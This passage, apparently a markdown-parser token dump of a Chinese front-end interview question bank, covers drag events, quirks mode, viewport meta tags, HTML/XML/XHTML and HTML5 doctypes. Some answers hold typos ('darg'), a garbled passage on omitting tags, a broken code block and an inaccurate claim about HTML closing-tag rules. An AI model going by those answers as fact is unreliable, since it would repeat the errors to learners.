分）","escaped":false}]},{"type":"paragraph","raw":"dragstart：事件主体是被拖放元素，在开始拖放被拖放元素时触发。","text":"dragstart：事件主体是被拖放元素，在开始拖放被拖放元素时触发。","tokens":[{"type":"text","raw":"dragstart：事件主体是被拖放元素，在开始拖放被拖放元素时触发。","text":"dragstart：事件主体是被拖放元素，在开始拖放被拖放元素时触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"darg：事件主体是被拖放元素，在正在拖放被拖放元素时触发。","text":"darg：事件主体是被拖放元素，在正在拖放被拖放元素时触发。","tokens":[{"type":"text","raw":"darg：事件主体是被拖放元素，在正在拖放被拖放元素时触发。","text":"darg：事件主体是被拖放元素，在正在拖放被拖放元素时触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"dragenter：事件主体是目标元素，在被拖放元素进入某元素时触发。","text":"dragenter：事件主体是目标元素，在被拖放元素进入某元素时触发。","tokens":[{"type":"text","raw":"dragenter：事件主体是目标元素，在被拖放元素进入某元素时触发。","text":"dragenter：事件主体是目标元素，在被拖放元素进入某元素时触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"dragover：事件主体是目标元素，在被拖放在某元素内移动时触发。","text":"dragover：事件主体是目标元素，在被拖放在某元素内移动时触发。","tokens":[{"type":"text","raw":"dragover：事件主体是目标元素，在被拖放在某元素内移动时触发。","text":"dragover：事件主体是目标元素，在被拖放在某元素内移动时触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"dragleave：事件主体是目标元素，在被拖放元素移出目标元素是触发。","text":"dragleave：事件主体是目标元素，在被拖放元素移出目标元素是触发。","tokens":[{"type":"text","raw":"dragleave：事件主体是目标元素，在被拖放元素移出目标元素是触发。","text":"dragleave：事件主体是目标元素，在被拖放元素移出目标元素是触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"drop：事件主体是目标元素，在目标元素完全接受被拖放元素时触发。","text":"drop：事件主体是目标元素，在目标元素完全接受被拖放元素时触发。","tokens":[{"type":"text","raw":"drop：事件主体是目标元素，在目标元素完全接受被拖放元素时触发。","text":"drop：事件主体是目标元素，在目标元素完全接受被拖放元素时触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"dragend：事件主体是被拖放元素，在整个拖放操作结束时触发。","text":"dragend：事件主体是被拖放元素，在整个拖放操作结束时触发。","tokens":[{"type":"text","raw":"dragend：事件主体是被拖放元素，在整个拖放操作结束时触发。","text":"dragend：事件主体是被拖放元素，在整个拖放操作结束时触发。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 32. Quirks（怪癖）模式是什么？它和Standards（标准）有什么区别？\\n\\n","depth":2,"text":"32. Quirks（怪癖）模式是什么？它和Standards（标准）有什么区别？","tokens":[{"type":"text","raw":"32. Quirks（怪癖）模式是什么？它和Standards（标准）有什么区别？","text":"32. Quirks（怪癖）模式是什么？它和Standards（标准）有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"页面如果写了DTD，就意味着这个页面采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式，这就是Quirks模式，有时候也叫怪癖模式、诡异模式、怪异模式。","text":"页面如果写了DTD，就意味着这个页面采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式，这就是Quirks模式，有时候也叫怪癖模式、诡异模式、怪异模式。","tokens":[{"type":"text","raw":"页面如果写了DTD，就意味着这个页面采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式，这就是Quirks模式，有时候也叫怪癖模式、诡异模式、怪异模式。","text":"页面如果写了DTD，就意味着这个页面采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式，这就是Quirks模式，有时候也叫怪癖模式、诡异模式、怪异模式。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"区别：总体会有布局、样式解析、脚本执行三个方面区别，这里列举一些比较常见的区别：","text":"区别：总体会有布局、样式解析、脚本执行三个方面区别，这里列举一些比较常见的区别：","tokens":[{"type":"text","raw":"区别：总体会有布局、样式解析、脚本执行三个方面区别，这里列举一些比较常见的区别：","text":"区别：总体会有布局、样式解析、脚本执行三个方面区别，这里列举一些比较常见的区别：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border\\n\\n- 设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效\\n\\n- 用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效\\n\\n- 设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border\\n\\n","task":false,"loose":true,"text":"盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border\\n","tokens":[{"type":"text","raw":"盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border\\n","text":"盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border","tokens":[{"type":"text","raw":"盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border","text":"盒模型：在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，然而在Quirks模式下，IE的宽度和高度还包含了padding和border","escaped":false}]}]},{"type":"list_item","raw":"- 设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效\\n\\n","task":false,"loose":true,"text":"设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效\\n","tokens":[{"type":"text","raw":"设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效\\n","text":"设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效","tokens":[{"type":"text","raw":"设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效","text":"设置行内元素的高宽：在Standards模式下，给行内元素设置width和height都不会生效，而在Quriks模式下会生效","escaped":false}]}]},{"type":"list_item","raw":"- 用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效\\n\\n","task":false,"loose":true,"text":"用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效\\n","tokens":[{"type":"text","raw":"用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效\\n","text":"用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效","tokens":[{"type":"text","raw":"用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效","text":"用margin：0 auto设置水平居中:在Standards模式下，设置margin：0 auto；可以使元素水平居中，但是在Quriks模式下失效","escaped":false}]}]},{"type":"list_item","raw":"- 设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","task":false,"loose":true,"text":"设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","tokens":[{"type":"text","raw":"设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","text":"设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","tokens":[{"type":"text","raw":"设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","text":"设置百分比高度:在Standards模式下，元素的高度是由包含的内容决定的，如果父元素没有设置百分比的高度，子元素设置百分比的高度是无效的","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 33. meta viewport 是做什么用的，怎么写？\\n\\n","depth":2,"text":"33. meta viewport 是做什么用的，怎么写？","tokens":[{"type":"text","raw":"33. meta viewport 是做什么用的，怎么写？","text":"33. meta viewport 是做什么用的，怎么写？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"Viewport，适配移动端，可以控制视口的大小和比例：","text":"Viewport，适配移动端，可以控制视口的大小和比例：","tokens":[{"type":"text","raw":"Viewport，适配移动端，可以控制视口的大小和比例：","text":"Viewport，适配移动端，可以控制视口的大小和比例：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1, maximum-scale=1\\">\\n\\n```","lang":"html","text":"\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1, maximum-scale=1\\">\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"width viewport ：宽度(数值/device-width)","text":"width viewport ：宽度(数值/device-width)","tokens":[{"type":"text","raw":"width viewport ：宽度(数值/device-width)","text":"width viewport ：宽度(数值/device-width)","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"height viewport ：高度(数值/device-height)","text":"height viewport ：高度(数值/device-height)","tokens":[{"type":"text","raw":"height viewport ：高度(数值/device-height)","text":"height viewport ：高度(数值/device-height)","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"initial-scale ：初始缩放比例","text":"initial-scale ：初始缩放比例","tokens":[{"type":"text","raw":"initial-scale ：初始缩放比例","text":"initial-scale ：初始缩放比例","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"maximum-scale ：最大缩放比例","text":"maximum-scale ：最大缩放比例","tokens":[{"type":"text","raw":"maximum-scale ：最大缩放比例","text":"maximum-scale ：最大缩放比例","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"minimum-scale ：最小缩放比例","text":"minimum-scale ：最小缩放比例","tokens":[{"type":"text","raw":"minimum-scale ：最小缩放比例","text":"minimum-scale ：最小缩放比例","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 34. HTML、XML、XHTML 的区别\\n\\n","depth":2,"text":"34. HTML、XML、XHTML 的区别","tokens":[{"type":"text","raw":"34. HTML、XML、XHTML 的区别","text":"34. HTML、XML、XHTML 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；\\n\\n- XML：可扩展标记语言，是语法较为严格、严格的标记语言；\\n\\n- XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；\\n\\n","task":false,"loose":true,"text":"HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；\\n","tokens":[{"type":"text","raw":"HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；\\n","text":"HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；","tokens":[{"type":"text","raw":"HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；","text":"HTML：超文本标记语言，是语法较为松散的、不严格的Web语言；","escaped":false}]}]},{"type":"list_item","raw":"- XML：可扩展标记语言，是语法较为严格、严格的标记语言；\\n\\n","task":false,"loose":true,"text":"XML：可扩展标记语言，是语法较为严格、严格的标记语言；\\n","tokens":[{"type":"text","raw":"XML：可扩展标记语言，是语法较为严格、严格的标记语言；\\n","text":"XML：可扩展标记语言，是语法较为严格、严格的标记语言；","tokens":[{"type":"text","raw":"XML：可扩展标记语言，是语法较为严格、严格的标记语言；","text":"XML：可扩展标记语言，是语法较为严格、严格的标记语言；","escaped":false}]}]},{"type":"list_item","raw":"- XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","task":false,"loose":true,"text":"XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","tokens":[{"type":"text","raw":"XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","text":"XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","tokens":[{"type":"text","raw":"XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","text":"XHTML：可扩展超文本标记语言，是HTML进行XML严格化的结果；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 35. 什么是HTML5以及和HTML的区别是什么\\n\\n","depth":2,"text":"35. 什么是HTML5以及和HTML的区别是什么","tokens":[{"type":"text","raw":"35. 什么是HTML5以及和HTML的区别是什么","text":"35. 什么是HTML5以及和HTML的区别是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"HTML5是HTML的新标准，其主要目标是无需任何额外的插件如Flash、Silverlight等，就可以传输所有内容。它囊括了动画、视频、丰富的图形用户界面等。","text":"HTML5是HTML的新标准，其主要目标是无需任何额外的插件如Flash、Silverlight等，就可以传输所有内容。它囊括了动画、视频、丰富的图形用户界面等。","tokens":[{"type":"text","raw":"HTML5是HTML的新标准，其主要目标是无需任何额外的插件如Flash、Silverlight等，就可以传输所有内容。它囊括了动画、视频、丰富的图形用户界面等。","text":"HTML5是HTML的新标准，其主要目标是无需任何额外的插件如Flash、Silverlight等，就可以传输所有内容。它囊括了动画、视频、丰富的图形用户界面等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"HTML5是由万维网联盟（W3C）和Web Hypertext Application Technology Working Group 合作创建的HTML新版本。","text":"HTML5是由万维网联盟（W3C）和Web Hypertext Application Technology Working Group 合作创建的HTML新版本。","tokens":[{"type":"text","raw":"HTML5是由万维网联盟（W3C）和Web Hypertext Application Technology Working Group 合作创建的HTML新版本。","text":"HTML5是由万维网联盟（W3C）和Web Hypertext Application Technology Working Group 合作创建的HTML新版本。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"从文档声明类型上看：","text":"从文档声明类型上看：","tokens":[{"type":"text","raw":"从文档声明类型上看：","text":"从文档声明类型上看：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- HTML是很长的一段代码，很难记住。如下代码：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- HTML是很长的一段代码，很难记住。如下代码：","task":false,"loose":false,"text":"HTML是很长的一段代码，很难记住。如下代码：","tokens":[{"type":"text","raw":"HTML是很长的一段代码，很难记住。如下代码：","text":"HTML是很长的一段代码，很难记住。如下代码：","tokens":[{"type":"text","raw":"HTML是很长的一段代码，很难记住。如下代码：","text":"HTML是很长的一段代码，很难记住。如下代码：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n\\n<!DOCTYPE html PUBLIC \\"-//W3C//DTD XHTML 1.0 Transitional//EN\\" \\"\\nhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\">\\n<html xmlns=\\"http://www.w3.org/1999/xhtml\\">\\n\\n\\n- HTML5却只有简简单单的声明，方便记忆。如下：\\n\\n```html\\n\\n<!DOCTYPE html>\\n\\n```","lang":"html","text":"\\n<!DOCTYPE html PUBLIC \\"-//W3C//DTD XHTML 1.0 Transitional//EN\\" \\"\\nhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\">\\n<html xmlns=\\"http://www.w3.org/1999/xhtml\\">\\n\\n\\n- HTML5却只有简简单单的声明，方便记忆。如下：\\n\\n```html\\n\\n<!DOCTYPE html>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"从语法规则上看：","text":"从语法规则上看：","tokens":[{"type":"text","raw":"从语法规则上看：","text":"从语法规则上看：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；\\n\\n- HTML5允许省略标签，比如`<img>`标签的`<img>`、`<br>`标签的`<br>`、`<input>`标签的`<input>`等，这种情况下，标签的结束标志不是必需的；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；\\n\\n","task":false,"loose":true,"text":"HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；\\n","tokens":[{"type":"text","raw":"HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；\\n","text":"HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；","tokens":[{"type":"text","raw":"HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；","text":"HTML5的语法规则非常宽松，不需要严格的闭合标签，不像HTML那样，标签必须闭合；","escaped":false}]}]},{"type":"list_item","raw":"- HTML5允许省略标签，比如`<img>`标签的`<img>`、`<br>`标签的`<br>`、`<input>`标签的`<input>`等，这种情况下，标签的结束标志不是必需的；","task":false,"loose":true,"text":"HTML5允许省略标签，比如`<img>`标签的`<img>`、`<br>`标签的`<br>`、`<input>`标签的`<input>`等，这种情况下，标签的结束标志不是必需的；","tokens":[{"type":"text","raw":"HTML5允许省略标签，比如`<img>`标签的`<img>`、`<br>`标签的`<br>`、`<input>`标签的`<input>`等，这种情况下，标签的结束标志不是必需的；","text":"HTML5允许省略标签，比如`<img>`标签的`<img>`、`<br>`标签的`<br>`、`<input>`标签的`<input>`等，这种情况下，标签的结束标志不是必需的；","tokens":[{"type":"text","raw":"HTML5允许省略标签，比如","text":"HTML5允许省略标签，比如","escaped":false},{"type":"codespan","raw":"`<img>`","text":"<img>"},{"type":"text","raw":"标签的","text":"标签的","escaped":false},{"type":"codespan","raw":"`<img>`","text":"<img>"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`<br>`","text":"<br>"},{"type":"text","raw":"标签的","text":"标签的","escaped":false},{"type":"codespan","raw":"`<br>`","text":"<br>"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`<input>`","text":"<input>"},{"type":"text","raw":"标签的","text":"标签的","escaped":false},{"type":"codespan","raw":"`<input>`","text":"<input>"},{"type":"text","raw":"等，这种情况下，标签的结束标志不是必需的；","text":"等，这种情况下，标签的结束标志不是必需的；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 36. HTML5 为什么只需要写 docType\\n\\n","depth":2,"text":"36. HTML5 为什么只需要写 docType","tokens":[{"type":"text","raw":"36. HTML5 为什么只需要写 docType","text":"36. HTML5 为什么只需要写 docType","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"这是因为HTML5不基于SGML，因此不需要对DTD进行引用，但是需要DOCTYPE来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。","text":"这是因为HTML5不基于SGML，因此不需要对DTD进行引用，但是需要DOCTYPE来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。","tokens":[{"type":"text","raw":"这是因为HTML5不基于SGML，因此不需要对DTD进行引用，但是需要DOCTYPE来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。","text":"这是因为HTML5不基于SGML，因此不需要对DTD进行引用，但是需要DOCTYPE来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 37. 支持HTML5的浏览器有哪些\\n\\n","depth":2,"text":"37. 支持HTML5的浏览器有哪些","tokens":[{"type":"text","raw":"37. 支持HTML5的浏览器有哪些","text":"37. 支持HTML5的浏览器有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"paragraph","raw":"现在几乎所有现有的浏览器都支持HTML5，例如Chrome, Opera, Safari, IE, 火狐等；","text":"现在几乎所有现有的浏览器都支持HTML5，例如Chrome, Opera, Safari, IE, 火狐等；","tokens":[{"type":"text","raw":"现在几乎所有现有的浏览器都支持HTML5，例如Chrome, Opera, Safari, IE, 火狐等；","text":"现在几乎所有现有的浏览器都支持HTML5，例如Chrome, Opera, Safari, IE, 火狐等；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 38. table的作用以及其优缺点\\n\\n","depth":2,"text":"38. table的作用以及其优缺点","tokens":[{"type":"text","raw":"38. table的作用以及其优缺点","text":"38. table的作用以及其优缺点","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"作用","text":"作用","tokens":[{"type":"text","raw":"作用","text":"作用","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 可用于布局（已过时）；\\n\\n- 用于显示批量数据；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 